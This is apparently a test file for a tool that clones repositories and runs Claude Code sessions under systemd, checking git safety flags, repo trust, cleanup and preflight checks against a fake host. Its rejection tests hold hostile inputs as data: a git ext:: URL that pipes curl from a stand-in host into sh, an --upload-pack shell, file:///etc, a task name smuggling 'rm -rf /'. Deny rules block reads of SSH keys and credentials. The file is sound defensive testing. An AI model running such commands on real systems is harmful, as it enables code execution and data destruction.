// The acting layer, against a fake box.
//
// These assert on the exact argv handed to git and systemctl, because that is where the rules in
// host-plan.mjs either hold or quietly stop applying. A test that only checked the return value
// would pass just as happily with the safety arguments dropped.

import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { posix as path } from "node:path";

import { createHost } from "../lib/host-steps.mjs";
import { loadConfig } from "../lib/host-plan.mjs";
import { fakeFs, fakeRun, healthyResponses, HOME } from "./helpers/fake-world.mjs";

const config = loadConfig(JSON.stringify({ workspaceRoot: `${HOME}/workspace` })).config;

function makeHost({ files = {}, responses = {} } = {}) {
  const fs = fakeFs({
    "/proc/meminfo": "MemTotal:        4194304 kB\n",
    "/proc/sys/fs/inotify/max_user_watches": "524288\n",
    ...files,
  });
  const run = fakeRun(healthyResponses(responses));
  const host = createHost({ run, fs, home: HOME, repoRoot: "/opt/claude-skills", path });
  return { host, run, fs };
}

describe("addRepo — the clone", () => {
  test("passes -- before the URL, so a dash-leading URL cannot become a git option", () => {
    const { host, run } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const clone = run.find("git ").find((c) => c.argv.includes("clone"));
    assert.ok(clone, "git clone must have been run");
    const sep = clone.argv.indexOf("--");
    assert.ok(sep !== -1 && sep < clone.argv.indexOf("git@github.com:lorveil/workspace.git"));
  });

  test("turns off every transport that can execute, at the git layer too", () => {
    const { host, run } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const clone = run.find("git ").find((c) => c.argv.includes("clone"));
    const joined = clone.argv.join(" ");
    assert.match(joined, /protocol\.ext\.allow=never/);
    assert.match(joined, /protocol\.file\.allow=never/);
    assert.ok(clone.argv.includes("--no-recurse-submodules"));
  });

  test("runs git without a terminal prompt, so a private repo fails instead of hanging forever", () => {
    const { host, run } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const clone = run.find("git ").find((c) => c.argv.includes("clone"));
    assert.equal(clone.opts.env.GIT_TERMINAL_PROMPT, "0");
    assert.match(clone.opts.env.GIT_SSH_COMMAND, /BatchMode=yes/);
  });

  test("never uses a shell", () => {
    const { host, run } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    for (const call of run.calls) {
      assert.equal(call.opts.shell, undefined, `${call.line} must not ask for a shell`);
      assert.ok(Array.isArray(call.argv), `${call.line} must pass an argv array`);
    }
  });

  for (const hostile of ["ext::sh -c 'curl evil|sh'", "--upload-pack=/bin/sh", "file:///etc", "git://github.com/a/b"]) {
    test(`refuses ${JSON.stringify(hostile)} without running anything`, () => {
      const { host, run } = makeHost();
      const result = host.addRepo({ url: hostile, config });
      assert.equal(result.ok, false);
      assert.equal(run.ran("git "), false, "nothing may be executed for a rejected URL");
    });
  }

  test("cleans up the directory it made when the clone fails", () => {
    const { host, fs } = makeHost({ responses: { "git -c protocol.allow=never": { ok: false, code: 128, stderr: "repository not found" } } });
    const result = host.addRepo({ url: "git@github.com:lorveil/nope.git", config });
    assert.equal(result.ok, false);
    assert.match(result.reason, /clone failed/);
    assert.equal(fs.existsSync(`${HOME}/workspace/nope`), false, "a failed clone must not leave a directory behind");
  });
});

describe("addRepo — trust", () => {
  test("a repo you own is registered and ready, but nothing is started", () => {
    const { host, run } = makeHost();
    const result = host.addRepo({ url: "git@github.com:adamlinscott/thing.git", config });
    assert.equal(result.trusted, true);
    assert.equal(result.trust.basis, "owner");
    // Registering is not running. A session is a separate act with its own worktree.
    assert.equal(run.ran("systemctl --user start"), false);
    assert.match(result.next, /skillhost session thing/);
  });

  test("a repo owned by your organisation is registered too", () => {
    const { host } = makeHost();
    const result = host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    assert.equal(result.trusted, true);
    assert.equal(result.trust.basis, "org");
  });

  test("someone else's repo is cloned but not trusted, and says what to type next", () => {
    const { host } = makeHost();
    const result = host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    assert.equal(result.ok, true);
    assert.equal(result.trusted, false);
    assert.match(result.next, /skillhost trust thing/);
  });

  test("with no gh identity nothing is auto-trusted, and the reason says why", () => {
    const { host } = makeHost({ responses: { "/usr/bin/gh api user --jq .login": { ok: false, stderr: "not logged in" } } });
    const result = host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    assert.equal(result.trusted, false);
    assert.match(result.trust.reason, /ownership could not be checked/);
  });

  test("an explicit override trusts a foreign repo, and records that it was manual", () => {
    const { host } = makeHost();
    const result = host.addRepo({ url: "git@github.com:stranger/thing.git", config, trustOverride: true });
    assert.equal(result.trusted, true);
    assert.equal(result.trust.basis, "manual");
  });

  test("an untrusted repo cannot have a session started in it", () => {
    const { host } = makeHost();
    host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    const started = host.startSession({ repo: "thing", task: "x", config });
    assert.equal(started.ok, false);
    assert.match(started.reason, /not trusted/);
  });
});

describe("startSession", () => {
  function withRepo(extra = {}) {
    const made = makeHost(extra);
    made.host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    return made;
  }

  test("makes a worktree on its own branch, then starts the unit", () => {
    const { host, run } = withRepo();
    const result = host.startSession({ repo: "workspace", task: "fix login", config, suffix: "a1b2" });
    assert.equal(result.ok, true);
    assert.equal(result.id, "workspace-fix-login-a1b2");
    assert.ok(run.ran("git -C /home/dev/workspace/workspace worktree add -b claude/workspace-fix-login-a1b2"));
    assert.ok(run.ran("systemctl --user start skillhost-session@workspace-fix-login-a1b2.service"));
  });

  test("fetches first, so a session does not start on a stale HEAD", () => {
    // The clone is registered once and then sits there. Without this, a session started a month
    // later begins on whatever origin pointed at on the day the repo was added.
    const { host, run } = withRepo();
    host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    const calls = run.calls.map((c) => c.line);
    const fetchAt = calls.findIndex((l) => l.startsWith("git -C /home/dev/workspace/workspace fetch"));
    const addAt = calls.findIndex((l) => l.includes("worktree add"));
    assert.ok(fetchAt !== -1 && fetchAt < addAt, "the fetch must come before the worktree");
  });

  test("writes the metadata the bootstrap runner reads", () => {
    const { host, fs } = withRepo();
    host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    const meta = JSON.parse(fs.readFileSync("/home/dev/.local/state/skillhost/sessions/workspace-x-a1b2.json"));
    assert.equal(meta.repo, "workspace");
    assert.equal(meta.branch, "claude/workspace-x-a1b2");
  });

  test("a unit that will not start leaves nothing behind", () => {
    // The failure is nearly always the bootstrap refusing, and a half-made worktree with a dangling
    // branch is worse than no session at all.
    const { host, run, fs } = withRepo({ responses: { "systemctl --user start": { ok: false, code: 1, stderr: "job failed" } } });
    const result = host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    assert.equal(result.ok, false);
    assert.ok(run.ran("git -C /home/dev/workspace/workspace worktree remove"));
    assert.ok(run.ran("git -C /home/dev/workspace/workspace branch -D claude/workspace-x-a1b2"));
    assert.equal(fs.existsSync("/home/dev/.local/state/skillhost/sessions/workspace-x-a1b2.json"), false);
  });

  test("the failure hands back the journal, not a systemctl exit code", () => {
    const { host } = withRepo({
      responses: {
        "systemctl --user start": { ok: false, code: 1 },
        "journalctl": { stdout: "bootstrap: could not reach origin\n" },
      },
    });
    const result = host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    assert.match(result.diagnose.log, /could not reach origin/);
  });

  test("refuses a repo it does not know", () => {
    const { host } = makeHost();
    const result = host.startSession({ repo: "nothere", task: "x", config });
    assert.equal(result.ok, false);
    assert.match(result.reason, /skillhost list/);
  });

  test("refuses once the box is at capacity, and says how to make room", () => {
    const { host } = withRepo({
      files: { "/proc/meminfo": "MemTotal:        1048576 kB\n" },
      responses: { "pgrep -f remote-control": { ok: true, stdout: "111\n" } },
    });
    host.startSession({ repo: "workspace", task: "one", config, suffix: "0001" });
    const second = host.startSession({ repo: "workspace", task: "two", config, suffix: "0002" });
    assert.equal(second.ok, false);
    assert.equal(second.atCapacity, true);
    assert.match(second.reason, /skillhost end/);
  });

  test("a hostile task name cannot escape the session id", () => {
    const { host } = withRepo();
    const result = host.startSession({ repo: "workspace", task: "../../etc; rm -rf /", config, suffix: "a1b2" });
    assert.equal(result.ok, true);
    assert.match(result.id, /^[a-z0-9-]+$/);
    assert.ok(result.worktree.startsWith("/home/dev/workspace/.sessions/"));
  });
});

describe("listSessions", () => {
  function withSession(extra = {}) {
    const made = makeHost(extra);
    made.host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    made.host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    return made;
  }

  test("does not call a live unit healthy when no process is behind it", () => {
    // This is the failure that leaves the Claude app offering a session whose requests hang.
    const { host } = withSession({
      responses: {
        "systemctl --user is-active": { stdout: "active\n" },
        "pgrep -f remote-control workspace-x-a1b2": { ok: false, code: 1, stdout: "" },
      },
    });
    const [session] = host.listSessions({ config });
    assert.equal(session.unitState, "active");
    assert.equal(session.alive, false);
    assert.doesNotMatch(session.summary, /live/);
  });

  test("says it is live only when a process really answers", () => {
    const { host } = withSession({
      responses: {
        "systemctl --user is-active": { stdout: "active\n" },
        "pgrep -f remote-control workspace-x-a1b2": { ok: true, stdout: "4321\n" },
      },
    });
    const [session] = host.listSessions({ config });
    assert.match(session.summary, /live/);
  });

  test("flags a finished session that is still holding a worktree", () => {
    const { host, fs } = withSession({ responses: { "pgrep -f remote-control": { ok: false, stdout: "" } } });
    // git is faked, so nothing actually made the directory. Stand in for it, because what is under
    // test is the reporting, not git.
    fs.mkdirSync("/home/dev/workspace/.sessions/workspace-x-a1b2", { recursive: true });
    const [session] = host.listSessions({ config });
    assert.equal(session.orphanedWorktree, true);
  });
});

describe("endSession", () => {
  function withSession(extra = {}) {
    const made = makeHost(extra);
    made.host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    made.host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    return made;
  }

  test("stops the unit rather than killing the process", () => {
    // A SIGTERM through systemd gives Claude a chance to close its session properly; a kill can
    // leave the app still offering it.
    const { host, run } = withSession();
    host.endSession({ id: "workspace-x-a1b2", config });
    assert.ok(run.ran("systemctl --user stop skillhost-session@workspace-x-a1b2.service"));
    assert.equal(run.ran("kill"), false);
  });

  test("keeps the worktree unless purge is asked for", () => {
    const { host, run } = withSession();
    host.endSession({ id: "workspace-x-a1b2", config });
    assert.equal(run.ran("git -C /home/dev/workspace/workspace worktree remove"), false);
  });

  test("reclaims the worktree and branch on purge", () => {
    const { host, run } = withSession();
    const result = host.endSession({ id: "workspace-x-a1b2", config, purge: true });
    assert.equal(result.purged, true);
    assert.ok(run.ran("git -C /home/dev/workspace/workspace worktree remove"));
    assert.ok(run.ran("git -C /home/dev/workspace/workspace branch -D claude/workspace-x-a1b2"));
  });

  test("refuses to delete a worktree holding uncommitted work, and says so", () => {
    const { host, run } = withSession({
      responses: { "git -C /home/dev/workspace/.sessions/workspace-x-a1b2 status --porcelain": { stdout: " M file.txt\n" } },
    });
    const result = host.endSession({ id: "workspace-x-a1b2", config, purge: true });
    assert.equal(result.purged, false);
    assert.equal(result.kept, "uncommitted changes");
    assert.equal(run.ran("git -C /home/dev/workspace/workspace worktree remove"), false);
  });

  test("refuses to delete a worktree holding unpushed commits", () => {
    const { host } = withSession({
      responses: { "git -C /home/dev/workspace/.sessions/workspace-x-a1b2 log": { stdout: "abc123 wip\n" } },
    });
    const result = host.endSession({ id: "workspace-x-a1b2", config, purge: true });
    assert.equal(result.purged, false);
    assert.equal(result.kept, "unpushed commits");
  });

  test("a traversal id never reaches systemctl", () => {
    const { host, run } = withSession();
    run.calls.length = 0;
    const result = host.endSession({ id: "../../etc", config, purge: true });
    assert.equal(result.ok, false);
    assert.equal(run.ran("systemctl"), false);
  });
});

describe("reapSessions", () => {
  function withDeadSession(extra = {}) {
    const made = makeHost({
      ...extra,
      responses: { "pgrep -f remote-control": { ok: false, stdout: "" }, ...(extra.responses ?? {}) },
    });
    made.host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    made.host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    return made;
  }

  test("reclaims a session whose process is gone", () => {
    const { host } = withDeadSession();
    const result = host.reapSessions({ config });
    assert.equal(result.reaped.length, 1);
  });

  test("never touches a session that is still running", () => {
    const made = makeHost({ responses: { "pgrep -f remote-control": { ok: true, stdout: "999\n" } } });
    made.host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    made.host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    const result = made.host.reapSessions({ config });
    assert.equal(result.reaped.length, 0);
    assert.equal(result.kept[0].why, "still running");
  });

  test("keeps anything with work in it, however dead the session", () => {
    const { host } = withDeadSession({
      responses: { "git -C /home/dev/workspace/.sessions/workspace-x-a1b2 status --porcelain": { stdout: " M x\n" } },
    });
    const result = host.reapSessions({ config });
    assert.equal(result.reaped.length, 0);
    assert.equal(result.kept[0].why, "uncommitted changes");
  });

  test("a dry run deletes nothing", () => {
    const { host, run } = withDeadSession();
    host.reapSessions({ config, dryRun: true });
    assert.equal(run.ran("git -C /home/dev/workspace/workspace worktree remove"), false);
  });
});

describe("the unit and runner that get written", () => {
  test("the unit carries the resolved claude path, not a guess", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const unit = fs.readFileSync(`${HOME}/.config/systemd/user/skillhost-session@.service`);
    assert.match(unit, new RegExp(`${HOME}/\\.local/bin/claude`));
    assert.doesNotMatch(unit, /\/usr\/local\/bin\/claude/);
  });

  test("one template covers every session", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/alpha.git", config });
    host.addRepo({ url: "git@github.com:lorveil/beta.git", config });
    const unit = fs.readFileSync(`${HOME}/.config/systemd/user/skillhost-session@.service`);
    assert.match(unit, /WorkingDirectory=\/home\/dev\/workspace\/\.sessions\/%i/);
    assert.doesNotMatch(unit, /alpha/);
    assert.doesNotMatch(unit, /beta/);
  });

  test("the bootstrap runner is written executable", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    assert.ok(fs.existsSync(`${HOME}/.local/state/skillhost/bootstrap-runner`));
  });

  test("reloads systemd after writing, or the change is invisible", () => {
    const { host, run } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    assert.ok(run.ran("systemctl --user daemon-reload"));
  });

  test("every written file is recorded for uninstall", () => {
    const { host } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const files = host.manifest.read().files;
    assert.ok(files.some((f) => f.endsWith("skillhost-session@.service")));
    assert.ok(files.some((f) => f.endsWith("skillhost.slice")));
    assert.ok(files.some((f) => f.endsWith("bootstrap-runner")));
  });
});

describe("listRepos", () => {
  test("counts the sessions running in each repo", () => {
    const { host } = makeHost({ responses: { "pgrep -f remote-control": { ok: true, stdout: "5\n" } } });
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    host.startSession({ repo: "workspace", task: "x", config, suffix: "a1b2" });
    const [repo] = host.listRepos({ config });
    assert.equal(repo.liveSessions, 1);
    assert.match(repo.summary, /1 session running/);
  });

  test("an untrusted repo says what to type", () => {
    const { host } = makeHost();
    host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    const [repo] = host.listRepos({ config });
    assert.match(repo.summary, /skillhost trust thing/);
  });
});

describe("preflight", () => {
  test("a healthy box has nothing to stop it", () => {
    const { host } = makeHost();
    const report = host.preflight({ env: { USER: "dev" } });
    assert.deepEqual(report.stop.map((c) => c.id), []);
  });

  test("linger off is a stop, because everything would die at logout", () => {
    const { host } = makeHost({ responses: { "loginctl show-user": { stdout: "Linger=no\n" } } });
    const report = host.preflight({ env: { USER: "dev" } });
    const linger = report.stop.find((c) => c.id === "linger");
    assert.ok(linger, "linger being off must stop the setup");
    assert.match(linger.fix, /enable-linger/);
  });

  test("an inference-only token is a stop, since Remote Control refuses it", () => {
    const { host } = makeHost();
    const report = host.preflight({ env: { USER: "dev", CLAUDE_CODE_OAUTH_TOKEN: "sk-ant-oat-x" } });
    const found = report.stop.find((c) => c.id === "oauth-token-env");
    assert.ok(found);
    assert.match(found.fix, /inference-only/);
  });

  for (const key of ["CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC", "DISABLE_GROWTHBOOK"]) {
    test(`${key} is caught, because it silently turns Remote Control off`, () => {
      const { host } = makeHost();
      const report = host.preflight({ env: { USER: "dev", [key]: "1" } });
      assert.ok(report.stop.some((c) => c.id === `env-${key}`));
    });
  }

  test("a redirected base URL is caught", () => {
    const { host } = makeHost();
    const report = host.preflight({ env: { USER: "dev", ANTHROPIC_BASE_URL: "https://proxy.internal" } });
    assert.ok(report.stop.some((c) => c.id === "base-url"));
  });

  test("a claude without --spawn worktree is a stop with an upgrade instruction", () => {
    const { host } = makeHost({ responses: { [`${HOME}/.local/bin/claude remote-control --help`]: { stdout: "usage: remote-control" } } });
    const report = host.preflight({ env: { USER: "dev" } });
    const found = report.stop.find((c) => c.id === "remote-control");
    assert.ok(found);
    assert.match(found.fix, /claude update/);
  });

  test("running as root is flagged but does not block", () => {
    const { host } = makeHost();
    const report = host.preflight({ env: { USER: "root" } });
    assert.ok(report.warn.some((c) => c.id === "not-root"));
    assert.equal(report.stop.some((c) => c.id === "not-root"), false);
  });

  test("every failing check carries a fix, not just a complaint", () => {
    const { host } = makeHost({ responses: { "loginctl show-user": { stdout: "Linger=no\n" }, "which script": { ok: false } } });
    const report = host.preflight({ env: { USER: "dev" } });
    for (const check of [...report.stop, ...report.warn]) {
      assert.ok(check.fix && check.fix.length > 5, `${check.id} must say how to fix it`);
    }
  });
});

describe("settings", () => {
  const additions = { permissions: { deny: ["Read(~/.ssh/**)", "Read(~/.claude/.credentials.json)"] } };

  test("merges the rules and records them for uninstall", () => {
    const { host, fs } = makeHost();
    const result = host.applySettings(additions);
    assert.equal(result.ok, true);
    const written = JSON.parse(fs.readFileSync(`${HOME}/.claude/settings.json`));
    assert.deepEqual(written.permissions.deny, additions.permissions.deny);
    assert.deepEqual(host.manifest.read().settingsAdded.deny, additions.permissions.deny);
  });

  test("keeps rules the user already had", () => {
    const { host, fs } = makeHost({
      files: { [`${HOME}/.claude/settings.json`]: JSON.stringify({ permissions: { deny: ["Bash(rm -rf /)"] } }) },
    });
    host.applySettings(additions);
    const written = JSON.parse(fs.readFileSync(`${HOME}/.claude/settings.json`));
    assert.ok(written.permissions.deny.includes("Bash(rm -rf /)"));
  });

  test("refuses to touch a settings file it cannot parse", () => {
    const { host } = makeHost({ files: { [`${HOME}/.claude/settings.json`]: "{ broken" } });
    const result = host.applySettings(additions);
    assert.equal(result.ok, false);
    assert.match(result.reason, /not valid JSON/);
  });

  test("reverting removes what was added and leaves the rest", () => {
    const { host, fs } = makeHost({
      files: { [`${HOME}/.claude/settings.json`]: JSON.stringify({ permissions: { deny: ["Bash(rm -rf /)"] } }) },
    });
    host.applySettings(additions);
    host.revertSettings();
    const written = JSON.parse(fs.readFileSync(`${HOME}/.claude/settings.json`));
    assert.deepEqual(written.permissions.deny, ["Bash(rm -rf /)"]);
  });

  test("running twice does not double the rules", () => {
    const { host, fs } = makeHost();
    host.applySettings(additions);
    host.applySettings(additions);
    const written = JSON.parse(fs.readFileSync(`${HOME}/.claude/settings.json`));
    assert.equal(written.permissions.deny.length, additions.permissions.deny.length);
  });
});

describe("trustRepo", () => {
  test("records trust against the repo's own path, not the whole workspace", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    host.trustRepo({ name: "thing", config });
    const claudeJson = JSON.parse(fs.readFileSync(`${HOME}/.claude.json`));
    assert.equal(claudeJson.projects[`${HOME}/workspace/thing`].hasTrustDialogAccepted, true);
    // A blanket grant on the workspace root would make every future clone trusted without anyone
    // deciding. That is the thing this design refuses to do.
    assert.equal(claudeJson.projects[`${HOME}/workspace`], undefined);
  });

  test("refuses a repo it does not know about", () => {
    const { host } = makeHost();
    const result = host.trustRepo({ name: "nothere", config });
    assert.equal(result.ok, false);
    assert.match(result.reason, /skillhost list/);
  });

  test("will not write over a ~/.claude.json it cannot parse", () => {
    const { host } = makeHost({ files: { [`${HOME}/.claude.json`]: "{ broken" } });
    host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    const result = host.trustRepo({ name: "thing", config });
    assert.equal(result.ok, false);
    assert.match(result.reason, /not valid JSON/);
  });

  test("uninstalling a repo withdraws its trust", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:stranger/thing.git", config });
    host.trustRepo({ name: "thing", config });
    host.removeRepo({ name: "thing", config });
    const claudeJson = JSON.parse(fs.readFileSync(`${HOME}/.claude.json`));
    assert.equal(claudeJson.projects[`${HOME}/workspace/thing`]?.hasTrustDialogAccepted, undefined);
  });
});

describe("token", () => {
  test("is written 0600 and only once", () => {
    const { host, fs } = makeHost();
    const first = host.ensureToken(() => Buffer.from("0123456789abcdef0123456789abcdef"));
    const second = host.ensureToken(() => Buffer.from("different-bytes-entirely-here!!!"));
    assert.equal(first.created, true);
    assert.equal(second.created, false);
    assert.equal(first.token, second.token, "a second run must not invalidate the token in use");
    assert.ok(fs.existsSync(`${HOME}/.config/skillhost/token`));
  });

  test("lives outside the repo, so it cannot be committed by accident", () => {
    const { host } = makeHost();
    assert.equal(host.paths.tokenFile.startsWith("/opt/claude-skills"), false);
  });
});

describe("logging", () => {
  test("writes one JSON object per line, outside the workspace", () => {
    const { host, fs } = makeHost();
    host.addRepo({ url: "git@github.com:lorveil/workspace.git", config });
    const log = fs.readFileSync(`${HOME}/.local/state/skillhost/host.log`);
    for (const line of log.trim().split("\n")) JSON.parse(line);
    assert.equal(host.paths.logFile.startsWith(`${HOME}/workspace`), false, "sessions must not be able to rewrite the audit log");
  });

  test("a newline in a repo name cannot forge a log line", () => {
    const { host, fs } = makeHost();
    host.appendLog("test", { name: "a\nevent=fake" });
    const log = fs.readFileSync(`${HOME}/.local/state/skillhost/host.log`);
    assert.equal(log.trim().split("\n").length, 1);
  });
});

describe("pruneWorktrees", () => {
  test("keeps a worktree with uncommitted work however old it is", () => {
    const { host } = makeHost({
      responses: {
        "git -C /home/dev/workspace/workspace worktree list --porcelain": {
          stdout: "worktree /home/dev/workspace/workspace\n\nworktree /home/dev/workspace/workspace/.wt/old\nbranch refs/heads/claude/old\n\n",
        },
        "git -C /home/dev/workspace/workspace/.wt/old status --porcelain": { stdout: " M file.txt\n" },
      },
    });
    const result = host.pruneWorktrees({ name: "workspace", config, olderThanDays: 0 });
    assert.equal(result.removed.length, 0);
    assert.equal(result.kept[0].why, "uncommitted changes");
  });

  test("keeps a worktree with unpushed commits", () => {
    const { host } = makeHost({
      responses: {
        "git -C /home/dev/workspace/workspace worktree list --porcelain": {
          stdout: "worktree /home/dev/workspace/workspace\n\nworktree /home/dev/workspace/workspace/.wt/old\nbranch refs/heads/claude/old\n\n",
        },
        "git -C /home/dev/workspace/workspace/.wt/old log": { stdout: "abc123 work in progress\n" },
      },
    });
    const result = host.pruneWorktrees({ name: "workspace", config, olderThanDays: 0 });
    assert.equal(result.kept[0].why, "unpushed commits");
  });

  test("a dry run deletes nothing", () => {
    const { host, run } = makeHost({
      responses: {
        "git -C /home/dev/workspace/workspace worktree list --porcelain": {
          stdout: "worktree /home/dev/workspace/workspace\n\nworktree /home/dev/workspace/workspace/.wt/old\nbranch refs/heads/claude/old\n\n",
        },
      },
    });
    host.pruneWorktrees({ name: "workspace", config, olderThanDays: 0, dryRun: true });
    assert.equal(run.ran("git -C /home/dev/workspace/workspace worktree remove"), false);
  });

  test("never treats the main checkout as a worktree to reap", () => {
    const { host, run } = makeHost({
      responses: {
        "git -C /home/dev/workspace/workspace worktree list --porcelain": {
          stdout: "worktree /home/dev/workspace/workspace\nbranch refs/heads/main\n\n",
        },
      },
    });
    const result = host.pruneWorktrees({ name: "workspace", config, olderThanDays: 0 });
    assert.equal(result.removed.length, 0);
    assert.equal(run.ran("git -C /home/dev/workspace/workspace worktree remove"), false);
  });
});
